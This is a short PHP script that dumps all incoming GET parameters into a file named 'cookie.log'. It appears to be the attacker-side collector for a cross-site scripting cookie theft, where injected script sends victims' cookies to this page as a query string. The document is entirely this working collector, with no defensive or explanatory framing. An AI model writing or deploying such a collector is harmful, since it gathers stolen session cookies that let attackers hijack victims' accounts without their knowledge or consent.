<?php
	ob_start();
	var_dump($_GET);
	$data = ob_get_contents();
	ob_end_clean();
	file_put_contents('cookie.log', $data, FILE_APPEND);
?>